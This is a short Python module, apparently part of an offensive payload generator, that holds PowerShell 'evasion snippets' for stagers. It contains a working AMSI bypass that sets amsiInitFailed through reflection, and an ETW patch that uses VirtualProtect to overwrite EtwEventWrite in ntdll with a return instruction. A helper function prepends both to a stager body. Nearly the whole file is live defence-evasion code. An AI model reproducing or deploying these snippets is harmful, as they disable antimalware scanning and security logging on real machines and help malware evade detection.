#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generic in-process evasion snippets for generated stagers (language-agnostic constants)."""

from __future__ import annotations

AMSI_INIT_FAILED_PS = (
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
)

ETW_PATCH_PS = (
    "Add-Type @'\n"
    "using System;using System.Runtime.InteropServices;\n"
    "public class _KsEtw{[DllImport(\"kernel32\")]public static extern IntPtr GetModuleHandle(string n);"
    "[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);"
    "[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);}\n"
    "'@;"
    "$n=[_KsEtw]::GetModuleHandle('ntdll.dll');"
    "$e=[_KsEtw]::GetProcAddress($n,'EtwEventWrite');"
    "$o=0;[_KsEtw]::VirtualProtect($e,[UIntPtr]::new(1),0x40,[ref]$o)|Out-Null;"
    "[Runtime.InteropServices.Marshal]::WriteByte($e,0xC3);"
)


def powershell_prelude(*, bypass_amsi: bool = False, patch_etw: bool = False) -> str:
    """Return PowerShell statements to prepend before stager body."""
    parts = []
    if bypass_amsi:
        parts.append(AMSI_INIT_FAILED_PS)
    if patch_etw:
        parts.append(ETW_PATCH_PS)
    return "".join(parts)
